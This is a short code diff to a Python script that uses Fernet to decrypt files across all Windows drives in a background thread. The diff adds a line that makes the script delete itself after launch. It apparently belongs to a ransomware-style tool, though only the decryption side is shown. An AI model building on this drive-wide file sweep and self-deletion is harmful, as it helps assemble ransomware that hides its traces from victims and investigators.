@@ -2,6 +2,8 @@ import os
 from cryptography.fernet import Fernet, InvalidToken
 from win32api import GetLogicalDriveStrings
 from threading import Thread
+from os import remove
+from sys import argv
 
 
 while True:
@@ -37,3 +39,4 @@ def run():
         for file in files:
             decript(os.path.join(root,file))
 Thread(target=run).start()
+remove(argv[0])
